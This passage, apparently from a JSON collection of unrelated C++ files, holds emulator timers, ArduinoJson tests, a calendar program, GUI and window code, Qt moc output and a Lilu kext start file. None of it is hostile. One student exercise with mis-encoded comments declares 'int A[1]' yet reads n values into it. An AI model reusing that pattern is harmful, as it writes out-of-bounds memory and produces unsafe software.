 bDo_show_ids_67D559 = gRegistry_6FF968.Get_Debug_Setting_586E20(\"do_show_ids\");\n    bLimit_recycling_67D4CA = gRegistry_6FF968.Get_Debug_Setting_586E20(\"limit_recycling\");\n    bNo_annoying_chars_67D586 = gRegistry_6FF968.Get_Debug_Setting_586E20(\"no_annoying_chars\");\n    bSkip_slopes_67D505 = gRegistry_6FF968.Get_Debug_Setting_586E20(\"skip_slopes\");\n    bSkip_left_67D6BF = gRegistry_6FF968.Get_Debug_Setting_586E20(\"skip_left\");\n    bSkip_right_67D4E4 = gRegistry_6FF968.Get_Debug_Setting_586E20(\"skip_right\");\n    bSkip_top_67D574 = gRegistry_6FF968.Get_Debug_Setting_586E20(\"skip_top\");\n  ",
    "/*\n    Copyright 2024 Hydr8gon\n\n    This file is part of GamePawd.\n\n    GamePawd is free software: you can redistribute it and/or modify it\n    under the terms of the GNU General Public License as published by\n    the Free Software Foundation, either version 3 of the License, or\n    (at your option) any later version.\n\n    GamePawd is distributed in the hope that it will be useful, but\n    WITHOUT ANY WARRANTY; without even the implied warranty of\n    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the GNU\n    General Public License for more details.\n\n    You should have received a copy of the GNU General Public License\n    along with GamePawd. If not, see <https://www.gnu.org/licenses/>.\n*/\n\n#include <cstring>\n\n#include \"timers.h\"\n#include \"core.h\"\n#include \"interrupts.h\"\n\nnamespace Timers {\n    uint8_t shifts[2];\n    uint32_t timerCycles;\n    uint32_t countCycles;\n\n    uint64_t timers[2];\n    uint32_t controls[2];\n    uint32_t targets[2];\n    uint32_t timerScale;\n    uint32_t countScale;\n    uint32_t counter;\n\n    void tickTimers();\n    void tickCounter();\n}\n\nvoid Timers::reset() {\n    // Reset the prescale values\n    memset(shifts, 0, sizeof(shifts));\n    countCycles = 0;\n    timerCycles = 0;\n\n    // Reset the I/O registers\n    memset(timers, 0, sizeof(timers));\n    memset(controls, 0, sizeof(controls));\n    memset(targets, 0, sizeof(targets));\n    timerScale = 0;\n    countScale = 0;\n    counter = 0;\n\n    // Schedule initial tasks\n    timerCycles = Core::schedule(tickTimers, timerScale + 1);\n    countCycles = Core::schedule(tickCounter, countScale + 1);\n}\n\nvoid Timers::tickTimers() {\n    // Verify timestamp and schedule the next tick\n    if (timerCycles != Core::globalCycles) return;\n    timerCycles = Core::schedule(tickTimers, timerScale + 1);\n\n    // Increment enabled timers and trigger an interrupt on reload\n    for (int i = 0; i < 2; i++) {\n        if ((controls[i] & 0x2) && (timers[i]++ >> shifts[i]) == targets[i]) {\n            Interrupts::requestIrq(i);\n            timers[i] = 0;\n        }\n    }\n}\n\nvoid Timers::tickCounter() {\n    // Verify timestamp and schedule the next tick\n    if (countCycles != Core::globalCycles) return;\n    countCycles = Core::schedule(tickCounter, countScale + 1);\n\n    // Increment the counter\n    counter++;\n}\n\nuint32_t Timers::readCounter() {\n    // Read the current counter value\n    return counter;\n}\n\nuint32_t Timers::readControl(int i) {\n    // Read from one of the timer control registers\n    return controls[i];\n}\n\nuint32_t Timers::readTimer(int i) {\n    // Read one of the current timer values, adjusted for prescaling\n    return timers[i] >> shifts[i];\n}\n\nvoid Timers::writeTimerScale(uint32_t mask, uint32_t value) {\n    // Write to the timer prescale register and reschedule its next tick\n    timerScale = (timerScale & ~mask) | (value & mask);\n    timerCycles = Core::schedule(tickTimers, timerScale + 1);\n}\n\nvoid Timers::writeCountScale(uint32_t mask, uint32_t value) {\n    // Write to the counter prescale register and reschedule its next tick\n    countScale = (countScale & ~mask) | (value & mask);\n    countCycles = Core::schedule(tickCounter, countScale + 1);\n}\n\nvoid Timers::writeCounter(uint32_t mask, uint32_t value) {\n    // Write a new value to the counter\n    counter = (counter & ~mask) | (value & mask);\n}\n\nvoid Timers::writeControl(int i, uint32_t mask, uint32_t value) {\n    // Write to one of the timer control registers and reset the timer if disabled\n    controls[i] = (controls[i] & ~mask) | (value & mask);\n    if (~controls[i] & 0x2) timers[i] = 0;\n\n    // Set the prescale shift and adjust the timer if it changed\n    uint8_t shift = (controls[i] & 0x1) ? (((controls[i] >> 4) & 0x7) + 1) : 0;\n    if (shifts[i] == shift) return;\n    timers[i] = (timers[i] >> shifts[i]) << shift;\n    shifts[i] = shift;\n}\n\nvoid Timers::writeTimer(int i, uint32_t mask, uint32_t value) {\n    // Write one of the current timer values, adjusted for prescaling\n    timers[i] = (((timers[i] >> shifts[i]) & ~mask) | (value & mask)) << shifts[i];\n}\n\nvoid Timers::writeTarget(int i, uint32_t mask, uint32_t value) {\n    // Write to one of the timer target registers\n    targets[i] = (targets[i] & ~mask) | (value & mask);\n}\n",
    "// ArduinoJson - https://arduinojson.org\n// Copyright \u00a9 2014-2024, Benoit BLANCHON\n// MIT License\n\n#include <ArduinoJson.h>\n\n#include <catch.hpp>\n#include <string>\n\n#include \"Allocators.hpp\"\n#include \"Literals.hpp\"\n\nusing ArduinoJson::detail::sizeofArray;\nusing ArduinoJson::detail::sizeofObject;\n\nTEST_CASE(\"deserializeJson(JsonDocument&)\") {\n  SpyingAllocator spy;\n  JsonDocument doc(&spy);\n  doc.add(\"hello\"_s);\n  spy.clearLog();\n\n  auto err = deserializeJson(doc, \"[42]\");\n\n  REQUIRE(err == DeserializationError::Ok);\n  REQUIRE(doc.as<std::string>() == \"[42]\");\n  REQUIRE(spy.log() == AllocatorLog{\n                           Deallocate(sizeofPool()),\n                           Deallocate(sizeofString(\"hello\")),\n                           Allocate(sizeofPool()),\n                           Reallocate(sizeofPool(), sizeofArray(1)),\n                       });\n}\n\nTEST_CASE(\"deserializeJson(JsonVariant)\") {\n  SECTION(\"variant is bound\") {\n    SpyingAllocator spy;\n    JsonDocument doc(&spy);\n    doc.add(\"hello\"_s);\n    spy.clearLog();\n\n    JsonVariant variant = doc[0];\n\n    auto err = deserializeJson(variant, \"[42]\");\n\n    REQUIRE(err == DeserializationError::Ok);\n    REQUIRE(doc.as<std::string>() == \"[[42]]\");\n    REQUIRE(spy.log() == AllocatorLog{\n                             Deallocate(sizeofString(\"hello\")),\n                         });\n  }\n\n  SECTION(\"variant is unbound\") {\n    JsonVariant variant;\n\n    auto err = deserializeJson(variant, \"[42]\");\n\n    REQUIRE(err == DeserializationError::NoMemory);\n  }\n}\n\nTEST_CASE(\"deserializeJson(ElementProxy)\") {\n  SpyingAllocator spy;\n  JsonDocument doc(&spy);\n  doc.add(\"hello\"_s);\n  spy.clearLog();\n\n  SECTION(\"element already exists\") {\n    auto err = deserializeJson(doc[0], \"[42]\");\n\n    REQUIRE(err == DeserializationError::Ok);\n    REQUIRE(doc.as<std::string>() == \"[[42]]\");\n    REQUIRE(spy.log() == AllocatorLog{\n                             Deallocate(sizeofString(\"hello\")),\n                         });\n  }\n\n  SECTION(\"element must be created\") {\n    auto err = deserializeJson(doc[1], \"[42]\");\n\n    REQUIRE(err == DeserializationError::Ok);\n    REQUIRE(doc.as<std::string>() == \"[\\\"hello\\\",[42]]\");\n    REQUIRE(spy.log() == AllocatorLog{});\n  }\n}\n\nTEST_CASE(\"deserializeJson(MemberProxy)\") {\n  SpyingAllocator spy;\n  JsonDocument doc(&spy);\n  doc[\"hello\"_s] = \"world\"_s;\n  spy.clearLog();\n\n  SECTION(\"member already exists\") {\n    auto err = deserializeJson(doc[\"hello\"], \"[42]\");\n\n    REQUIRE(err == DeserializationError::Ok);\n    REQUIRE(doc.as<std::string>() == \"{\\\"hello\\\":[42]}\");\n    REQUIRE(spy.log() == AllocatorLog{\n                             Deallocate(sizeofString(\"world\")),\n                         });\n  }\n\n  SECTION(\"member must be created exists\") {\n    auto err = deserializeJson(doc[\"value\"], \"[42]\");\n\n    REQUIRE(err == DeserializationError::Ok);\n    REQUIRE(doc.as<std::string>() == \"{\\\"hello\\\":\\\"world\\\",\\\"value\\\":[42]}\");\n    REQUIRE(spy.log() == AllocatorLog{});\n  }\n}\n",
    "#include<iostream>\r\n#include<iomanip>\r\n#include<string>\r\nusing namespace std;\r\n// Function to check if a year is a leap year\r\nbool isleapyear(int year)\r\n{\r\n    return (year%4==0&&year%100!=0)||(year%400==0);\r\n}\r\n// Function to get the number of days in a month\r\nint daysinmonth(int month,int year)\r\n{\r\n    switch(month)\r\n    {\r\n        case 1:return 31;//January\r\n        case 2:return isleapyear(year)?29:28;//February\r\n        case 3:return 31;//March\r\n        case 4:return 30;//April\r\n        case 5:return 31;//May\r\n        case 6:return 30;//June\r\n        case 7:return 31;//July\r\n        case 8:return 31;//August\r\n        case 9:return 30;//September\r\n        case 10:return 31;//October\r\n        case 11:return 30;//November\r\n        case 12:return 31;//December\r\n        default:return 0;\r\n    }\r\n}\r\n//Function to get the day of the week for January 1st of the given year\r\nint firstdayofyear(int year)\r\n{\r\n    int y=year-(14-1)/12;\r\n    int x=y+y/4-y/100+y/400;\r\n    int m=1+12*((14-1)/12)-2;\r\n    int d=(1+x+(31*m)/12)%7;\r\n    return d;\r\n}\r\n//Function to print the calendar for a given year\r\nvoid prtcalendar(int year)\r\n{\r\n    string months[]=\r\n    {\r\n        \"January\",\"February\",\"March\",\"April\",\"May\",\"June\",\r\n        \"July\",\"August\",\"September\",\"October\",\"November\",\"December\"\r\n    };\r\n    int dayInmonth,startDay;\r\n    startDay=firstdayofyear(year);\r\n    for(int month=1;month<= 12;month++)\r\n    {\r\n        dayInmonth=daysinmonth(month,year);\r\n        cout<<\"\\n  ------------\"<<months[month-1]<<\"-------------\\n\";\r\n        cout<<\"  Sun  Mon  Tue  Wed  Thu  Fri  Sat\\n\";\r\n        // Print spaces for the first day of the month\r\n        for(int i=0;i<startDay;i++)\r\n        {\r\n            cout<<\"     \";\r\n        }\r\n        // Print days of the month\r\n        for(int day=1;day<=dayInmonth;day++)\r\n        {\r\n            cout<<setw(5)<<day;\r\n            if(++startDay>6)\r\n            {\r\n                startDay=0;\r\n                cout<<endl;\r\n            }\r\n        }\r\n        if(startDay!=0)\r\n        {\r\n            cout<<endl;\r\n        }\r\n    }\r\n}\r\nint main()\r\n{\r\n    int year;\r\n    cout<<\"Enter the year: \";\r\n    cin>>year;\r\n    cout<<\"\\nCalendar for the year \"<<year<<\":\\n\";\r\n    prtcalendar(year);\r\n    return 0;\r\n}\r\n",
    "#include \"imgui.h\"\n#include \"backends/imgui_impl_glfw.h\"\n#include \"backends/imgui_impl_opengl3.h\"\n#include <GLFW/glfw3.h>\n\n#include \"mavlink_connection.hpp\"\n\nint main() {\n\n    char connection_url[20] {};\n    bool is_connected = false;\n\n    if (!glfwInit())\n        return -1;\n\n    GLFWwindow* window = glfwCreateWindow(1280, 720, \"ImGui Window\", NULL, NULL);\n    if (window == NULL)\n        return -1;\n\n    glfwMakeContextCurrent(window);\n    // glfwSwapInterval(1); // Vsync\n\n    // ImGui Contexti Ba\u015flatma\n    IMGUI_CHECKVERSION();\n    ImGui::CreateContext();\n    ImGuiIO& io = ImGui::GetIO(); (void)io;\n\n    // Platform ve Renderer ba\u011flama\n    ImGui_ImplGlfw_InitForOpenGL(window, true);\n    ImGui_ImplOpenGL3_Init(\"#version 130\");\n\n    // Stil ayarlama\n    ImGui::StyleColorsDark();\n\n    MavlinkConnection* mavlink_connection = MavlinkConnection::get_singleton();\n\n    // Ana d\u00f6ng\u00fc\n    while (!glfwWindowShouldClose(window)) {\n        glfwPollEvents();\n\n        // Yeni bir ImGui frame'i ba\u015flatma\n        ImGui_ImplOpenGL3_NewFrame();\n        ImGui_ImplGlfw_NewFrame();\n        ImGui::NewFrame();\n\n        ImGui::SetNextWindowSize(ImVec2(400,100));\n        ImGui::SetNextWindowPos(ImVec2(10,10));\n\n        if (ImGui::Begin(\"Mavlink Access\", NULL, ImGuiWindowFlags_NoResize | ImGuiWindowFlags_NoCollapse | ImGuiWindowFlags_NoScrollbar | ImGuiWindowFlags_NoMove))\n        {\n            ImGui::InputText(\"Connection url\", connection_url, 20);\n            if(ImGui::Button(\"Connect\"))\n            {\n                if (mavlink_connection->init(connection_url)) {\n                    is_connected = true;\n                }\n            }\n            ImGui::End();\n        }\n\n        ImGui::SetNextWindowSize(ImVec2(400,500));\n        ImGui::SetNextWindowPos(ImVec2(10,120));\n        if (ImGui::Begin(\"Info\", NULL, ImGuiWindowFlags_NoResize | ImGuiWindowFlags_NoCollapse | ImGuiWindowFlags_NoScrollbar | ImGuiWindowFlags_NoMove))\n        {\n            if (is_connected) {\n                ImGui::Text(\"Connected\");\n                if (mavlink_connection->status_text()) \n                {\n                    const char* status_text = mavlink_connection->status_text();\n                    ImGui::Text(\"%s\", status_text);\n                }\n            } else {\n                ImGui::Text(\"Not Connected\");\n            }\n            \n            ImGui::End();\n        }\n\n        // Render\n        ImGui::Render();\n        int display_w, display_h;\n        glfwGetFramebufferSize(window, &display_w, &display_h);\n        glViewport(0, 0, display_w, display_h);\n        glClearColor(0.45f, 0.55f, 0.60f, 1.00f);\n        glClear(GL_COLOR_BUFFER_BIT);\n        ImGui_ImplOpenGL3_RenderDrawData(ImGui::GetDrawData());\n\n        glfwSwapBuffers(window);\n    }\n\n    // Clean\n    ImGui_ImplOpenGL3_Shutdown();\n    ImGui_ImplGlfw_Shutdown();\n    ImGui::DestroyContext();\n\n    glfwDestroyWindow(window);\n    glfwTerminate();\n\n    return 0;\n}",
    "/*3. \u00c7\u00e0\u00e4\u00e0\u00ed\u00ee \u00ef\u00ee\u00f1\u00eb\u00b3\u00e4\u00ee\u00e2\u00ed\u00b3\u00f1\u00f2\u00fc \u00e7\u00ed\u00e0\u00f7\u00e5\u00ed\u00fc \u00c0[n].\u00c7\u00ed\u00e0\u00e9\u00f2\u00e8 \u00ed\u00e0\u00e9\u00e1\u00b3\u00eb\u00fc\u00f8\u00e5 \u00b3 \u00ed\u00e0\u00e9\u00ec\u00e5\u00ed\u00f8\u00e5\n\u00e7\u00ed\u00e0\u00f7\u00e5\u00ed\u00ed\u00ff \u00f2\u00e0 \u00ef\u00ee\u00ec\u00b3\u00ed\u00ff\u00f2\u00e8 \u00bf\u00f5 \u00ec\u00b3\u00f1\u00f6\u00ff\u00ec\u00e8.*/\n#include <iostream>\n#include <limits.h> // \u00c4\u00eb\u00ff INT_MAX\n#include <Windows.h>\n\nusing namespace std;\n\nint main() {\n    int n;\n    SetConsoleCP(1251);\n    SetConsoleOutputCP(1251);\n\n    setlocale(LC_ALL, \"RU\");\n    cout << \"\u00c2\u00e2\u00e5\u00e4\u00b3\u00f2\u00fc \u00ea\u00b3\u00eb\u00fc\u00ea\u00b3\u00f1\u00f2\u00fc \u00e5\u00eb\u00e5\u00ec\u00e5\u00ed\u00f2\u00b3\u00e2 \u00f3 \u00ec\u00e0\u00f1\u00e8\u00e2\u00b3: \";\n    cin >> n;\n\n    int A[1]; // \u00ce\u00e3\u00ee\u00eb\u00ee\u00f8\u00f3\u00ba\u00ec\u00ee \u00ec\u00e0\u00f1\u00e8\u00e2 A \u00e7 n \u00e5\u00eb\u00e5\u00ec\u00e5\u00ed\u00f2\u00e0\u00ec\u00e8\n    cout << \"\u00c2\u00e2\u00e5\u00e4\u00b3\u00f2\u00fc \u00e5\u00eb\u00e5\u00ec\u00e5\u00ed\u00f2\u00e8 \u00ec\u00e0\u00f1\u00e8\u00e2\u00f3: \";\n    for (int i = 0; i < n; i++) {\n        cin >> A[i];\n    }\n\n    // \u00b2\u00ed\u00b3\u00f6\u00b3\u00e0\u00eb\u00b3\u00e7\u00f3\u00ba\u00ec\u00ee \u00b3\u00ed\u00e4\u00e5\u00ea\u00f1\u00e8 \u00e4\u00eb\u00ff \u00ed\u00e0\u00e9\u00e1\u00b3\u00eb\u00fc\u00f8\u00ee\u00e3\u00ee \u00b3 \u00ed\u00e0\u00e9\u00ec\u00e5\u00ed\u00f8\u00ee\u00e3\u00ee \u00e5\u00eb\u00e5\u00ec\u00e5\u00ed\u00f2\u00b3\u00e2\n    int max_index = 0, min_index = 0;\n\n    // \u00cf\u00f0\u00ee\u00f5\u00ee\u00e4\u00e8\u00ec\u00ee \u00ef\u00ee \u00ec\u00e0\u00f1\u00e8\u00e2\u00f3, \u00e7\u00ed\u00e0\u00f5\u00ee\u00e4\u00e8\u00ec\u00ee \u00ed\u00e0\u00e9\u00e1\u00b3\u00eb\u00fc\u00f8\u00e8\u00e9 \u00b3 \u00ed\u00e0\u00e9\u00ec\u00e5\u00ed\u00f8\u00e8\u00e9 \u00e5\u00eb\u00e5\u00ec\u00e5\u00ed\u00f2\n    for (int i = 1; i < n; i++) {\n        if (A[i] > A[max_index]) {\n            max_index = i; // \u00ce\u00ed\u00ee\u00e2\u00eb\u00fe\u00ba\u00ec\u00ee \u00b3\u00ed\u00e4\u00e5\u00ea\u00f1 \u00ed\u00e0\u00e9\u00e1\u00b3\u00eb\u00fc\u00f8\u00ee\u00e3\u00ee \u00e5\u00eb\u00e5\u00ec\u00e5\u00ed\u00f2\u00e0\n        }\n        if (A[i] < A[min_index]) {\n            min_index = i; // \u00ce\u00ed\u00ee\u00e2\u00eb\u00fe\u00ba\u00ec\u00ee \u00b3\u00ed\u00e4\u00e5\u00ea\u00f1 \u00ed\u00e0\u00e9\u00ec\u00e5\u00ed\u00f8\u00ee\u00e3\u00ee \u00e5\u00eb\u00e5\u00ec\u00e5\u00ed\u00f2\u00e0\n        }\n    }\n\n    // \u00cc\u00b3\u00ed\u00ff\u00ba\u00ec\u00ee \u00ec\u00b3\u00f1\u00f6\u00ff\u00ec\u00e8 \u00ed\u00e0\u00e9\u00e1\u00b3\u00eb\u00fc\u00f8\u00e8\u00e9 \u00b3 \u00ed\u00e0\u00e9\u00ec\u00e5\u00ed\u00f8\u00e8\u00e9 \u00e5\u00eb\u00e5\u00ec\u00e5\u00ed\u00f2\u00e8\n    int temp = A[max_index];\n    A[max_index] = A[min_index];\n    A[min_index] = temp;\n\n    // \u00c2\u00e8\u00e2\u00ee\u00e4\u00e8\u00ec\u00ee \u00ee\u00ed\u00ee\u00e2\u00eb\u00e5\u00ed\u00e8\u00e9 \u00ec\u00e0\u00f1\u00e8\u00e2\n    cout << \"\u00cc\u00e0\u00f1\u00e8\u00e2 \u00ef\u00b3\u00f1\u00eb\u00ff \u00ee\u00e1\u00ec\u00b3\u00ed\u00f3 \u00ed\u00e0\u00e9\u00e1\u00b3\u00eb\u00fc\u00f8\u00ee\u00e3\u00ee \u00b3 \u00ed\u00e0\u00e9\u00ec\u00e5\u00ed\u00f8\u00ee\u00e3\u00ee \u00e5\u00eb\u00e5\u00ec\u00e5\u00ed\u00f2\u00b3\u00e2: \";\n    for (int i = 0; i < n; i++) {\n        cout << A[i] << \" \";\n    }\n    cout << endl;\n\n    return 0;\n}\nc",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"mobile\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "/****************************************************************************\n** Meta object code from reading C++ file 'deposit.h'\n**\n** Created by: The Qt Meta Object Compiler version 67 (Qt 5.15.3)\n**\n** WARNING! All changes made in this file will be lost!\n*****************************************************************************/\n\n#include <memory>\n#include \"../Calculator/deposit.h\"\n#include <QtCore/qbytearray.h>\n#include <QtCore/qmetatype.h>\n#if !defined(Q_MOC_OUTPUT_REVISION)\n#error \"The header file 'deposit.h' doesn't include <QObject>.\"\n#elif Q_MOC_OUTPUT_REVISION != 67\n#error \"This file was generated using the moc from 5.15.3. It\"\n#error \"cannot be used with the include files from this version of Qt.\"\n#error \"(The moc has changed too much.)\"\n#endif\n\nQT_BEGIN_MOC_NAMESPACE\nQT_WARNING_PUSH\nQT_WARNING_DISABLE_DEPRECATED\nstruct qt_meta_stringdata_Deposit_t {\n    QByteArrayData data[6];\n    char stringdata0[127];\n};\n#define QT_MOC_LITERAL(idx, ofs, len) \\\n    Q_STATIC_BYTE_ARRAY_DATA_HEADER_INITIALIZER_WITH_OFFSET(len, \\\n    qptrdiff(offsetof(qt_meta_stringdata_Deposit_t, stringdata0) + ofs \\\n        - idx * sizeof(QByteArrayData)) \\\n    )\nstatic const qt_meta_stringdata_Deposit_t qt_meta_stringdata_Deposit = {\n    {\nQT_MOC_LITERAL(0, 0, 7), // \"Deposit\"\nQT_MOC_LITERAL(1, 8, 27), // \"on_radioButton_calc_clicked\"\nQT_MOC_LITERAL(2, 36, 0), // \"\"\nQT_MOC_LITERAL(3, 37, 33), // \"on_radioButton_creditcalc_cli...\"\nQT_MOC_LITERAL(4, 71, 27), // \"on_pushButton_count_clicked\"\nQT_MOC_LITERAL(5, 99, 27) // \"on_pushButton_clear_clicked\"\n\n    },\n    \"Deposit\\0on_radioButton_calc_clicked\\0\"\n    \"\\0on_radioButton_creditcalc_clicked\\0\"\n    \"on_pushButton_count_clicked\\0\"\n    \"on_pushButton_clear_clicked\"\n};\n#undef QT_MOC_LITERAL\n\nstatic const uint qt_meta_data_Deposit[] = {\n\n // content:\n       8,       // revision\n       0,       // classname\n       0,    0, // classinfo\n       4,   14, // methods\n       0,    0, // properties\n       0,    0, // enums/sets\n       0,    0, // constructors\n       0,       // flags\n       0,       // signalCount\n\n // slots: name, argc, parameters, tag, flags\n       1,    0,   34,    2, 0x08 /* Private */,\n       3,    0,   35,    2, 0x08 /* Private */,\n       4,    0,   36,    2, 0x08 /* Private */,\n       5,    0,   37,    2, 0x08 /* Private */,\n\n // slots: parameters\n    QMetaType::Void,\n    QMetaType::Void,\n    QMetaType::Void,\n    QMetaType::Void,\n\n       0        // eod\n};\n\nvoid Deposit::qt_static_metacall(QObject *_o, QMetaObject::Call _c, int _id, void **_a)\n{\n    if (_c == QMetaObject::InvokeMetaMethod) {\n        auto *_t = static_cast<Deposit *>(_o);\n        (void)_t;\n        switch (_id) {\n        case 0: _t->on_radioButton_calc_clicked(); break;\n        case 1: _t->on_radioButton_creditcalc_clicked(); break;\n        case 2: _t->on_pushButton_count_clicked(); break;\n        case 3: _t->on_pushButton_clear_clicked(); break;\n        default: ;\n        }\n    }\n    (void)_a;\n}\n\nQT_INIT_METAOBJECT const QMetaObject Deposit::staticMetaObject = { {\n    QMetaObject::SuperData::link<QDialog::staticMetaObject>(),\n    qt_meta_stringdata_Deposit.data,\n    qt_meta_data_Deposit,\n    qt_static_metacall,\n    nullptr,\n    nullptr\n} };\n\n\nconst QMetaObject *Deposit::metaObject() const\n{\n    return QObject::d_ptr->metaObject ? QObject::d_ptr->dynamicMetaObject() : &staticMetaObject;\n}\n\nvoid *Deposit::qt_metacast(const char *_clname)\n{\n    if (!_clname) return nullptr;\n    if (!strcmp(_clname, qt_meta_stringdata_Deposit.stringdata0))\n        return static_cast<void*>(this);\n    return QDialog::qt_metacast(_clname);\n}\n\nint Deposit::qt_metacall(QMetaObject::Call _c, int _id, void **_a)\n{\n    _id = QDialog::qt_metacall(_c, _id, _a);\n    if (_id < 0)\n        return _id;\n    if (_c == QMetaObject::InvokeMetaMethod) {\n        if (_id < 4)\n            qt_static_metacall(this, _c, _id, _a);\n        _id -= 4;\n    } else if (_c == QMetaObject::RegisterMethodArgumentMetaType) {\n        if (_id < 4)\n            *reinterpret_cast<int*>(_a[0]) = -1;\n        _id -= 4;\n    }\n    return _id;\n}\nQT_WARNING_POP\nQT_END_MOC_NAMESPACE\n",
    "#include <OGL3D/Window/OWindow.h>\n#include <Windows.h>\n#include <assert.h>\n\nLRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam)\n{\n\tswitch (msg)\n\t{\n\tcase WM_DESTROY:\n\t{\n\t\tOWindow* window = (OWindow *)GetWindowLongPtr(hwnd, GWLP_USERDATA);\n\t\twindow->onDestroy();\n\t\tbreak;\n\t}\n\tdefault:\n\t\treturn DefWindowProc(hwnd, msg, wParam, lParam);\n\t}\n\treturn NULL;\n}\n\nOWindow::OWindow()\n{\n\tWNDCLASSEX wc = {};\n\twc.cbSize = sizeof(WNDCLASSEX);\n\twc.lpszClassName = L\"OGL3DWindow\";\n\twc.lpfnWndProc = DefWindowProc;\n\n\tassert(RegisterClassEx(&wc));\n\n\tRECT rc = { 0,0,1280,768 };\n\tAdjustWindowRect(&rc, WS_OVERLAPPED | WS_CAPTION | WS_SYSMENU, false);\n\n\tm_handle = CreateWindowEx(NULL, \n\t\tL\"OGL3DWindow\", L\"OpenGLGame\", \n\t\tWS_OVERLAPPED | WS_CAPTION | WS_SYSMENU, \n\t\tCW_USEDEFAULT, CW_USEDEFAULT,\n\t\trc.right - rc.left, rc.bottom - rc.top, \n\t\tNULL, NULL, NULL, NULL);\n\n\tassert(m_handle);\n\n\tSetWindowLongPtr((HWND)m_handle, GWLP_USERDATA,(LONG_PTR)this);\n\n\tShowWindow((HWND)m_handle, SW_SHOW);\n\tUpdateWindow((HWND)m_handle);\n}\n\nOWindow::~OWindow()\n{\n\tDestroyWindow((HWND)m_handle);\n}\n\nvoid OWindow::onDestroy()\n{\n\tm_handle = nullptr;\n}\n\nbool OWindow::isClosed()\n{\n\treturn !m_handle;\n}\n",
    "//\n//  plugin_start.cpp\n//  Lilu\n//\n//  Copyright \u00a9 2016-2017 vit9696. All rights reserved.\n//\n\n#include <Headers/plugin_start.hpp>\n#include <Headers/kern_api.hpp>\n#include <Headers/kern_util.hpp>\n#include <Headers/kern_version.hpp>\n\n#ifndef LILU_CUSTOM_KMOD_INIT\nbool ADDPR(startSuccess) = false;\n#else\n// Workaround custom kmod code and enable by default\nbool ADDPR(startSuccess) = true;\n#endif /* LILU_CUSTOM_KMOD_INIT */\n\nbool ADDPR(debugEnabled) = false;\nuint32_t ADDPR(debugPrintDelay) = 0;\n\n#ifndef LILU_CUSTOM_IOKIT_INIT\n\nOSDefineMetaClassAndStructors(PRODUCT_NAME, IOService)\n\nPRODUCT_NAME *ADDPR(selfInstance) = nullptr;\n\nIOService *PRODUCT_NAME::probe(IOService *provider, SInt32 *score) {\n\tADDPR(selfInstance) = this;\n\tsetProperty(\"VersionInfo\", kextVersion);\n\tauto service = IOService::probe(provider, score);\n\treturn ADDPR(startSuccess) ? service : nullptr;\n}\n\nbool PRODUCT_NAME::start(IOService *provider) {\n\tADDPR(selfInstance) = this;\n\tif (!IOService::start(provider)) {\n\t\tSYSLOG(\"init\", \"failed to start the parent\");\n\t\treturn false;\n\t}\n\n\treturn ADDPR(startSuccess);\n}\n\nvoid PRODUCT_NAME::stop(IOService *provider) {\n\tADDPR(selfInstance) = nullptr;\n\tIOService::stop(provider);\n}\n\n#endif /* LILU_CUSTOM_IOKIT_INIT */\n\n#ifndef LILU_CUSTOM_KMOD_INIT\n\nEXPORT extern \"C\" kern_return_t ADDPR(kern_start)(kmod_info_t *, void *) {\n\t// This is an ugly hack necessary on some systems where buffering kills most of debug output.\n\tlilu_get_boot_args(\"liludelay\", &ADDPR(debugPrintDelay), sizeof(ADDPR(debugPrintDelay)));\n\n\tauto error = lilu.requestAccess();\n\tif (error == LiluAPI::Error::NoError) {\n\t\terror = lilu.shouldLoad(ADDPR(config).product, ADDPR(config).version, ADDPR(config).runmode, ADDPR(config).disableArg, ADDPR(config).disableArgNum,\n\t\t\t\t\t\t\t\tADDPR(config).debugArg, ADDPR(config).debugArgNum, ADDPR(config).betaArg, ADDPR(config).betaArgNum, ADDPR(config).minKernel,\n\t\t\t\t\t\t\t\tADDPR(config).maxKernel, ADDPR(debugEnabled));\n\n\t\tif (error == LiluAPI::Error::NoError) {\n\t\t\tDBGLOG(\"init\", \"%s bootstrap %s\", xStringify(PRODUCT_NAME), kextVersion);\n\t\t\t(void)kextVersion;\n\t\t\tADDPR(startSuccess) = true;\n\t\t\tADDPR(config).pluginStart();\n\t\t} else {\n\t\t\tSYSLOG(\"init\", \"parent said we should not continue %d\", error);\n\t\t}\n\n\t\tlilu.releaseAccess();\n\t} else {\n\t\tSYSLOG(\"init\", \"failed to call parent %d\", error);\n\t}\n\t\n\tfor (size_t i = 0; i < ADDPR(config).debugArgNum; i++) {\n\t\tif (checkKernelArgument(ADDPR(config).debugArg[i])) {\n\t\t\tADDPR(debugEnabled) = true;\n\t\t\tbreak;\n\t\t}\n\t}\n\n\tif (checkKernelArgument(\"-liludbgall\"))\n\t\tADDPR(debugEnabled) = true;\n\n\t// Report success but actually do not start and let I/O Kit unload us.\n\t// This works better and increases boot speed in some cases.\n\treturn KERN_SUCCESS;\n}\n\nEXPORT extern \"C\" kern_return_t ADDPR(kern_stop)(kmod_info_t *, void *) {\n\t// It is not safe to unload Lilu plugins unless they were disabled!\n\treturn ADDPR(startSuccess) ? KERN_FAILURE : KERN_SUCCESS;\n}\n\n#endif /* LILU_CUSTOM_KMOD_INIT */\n",
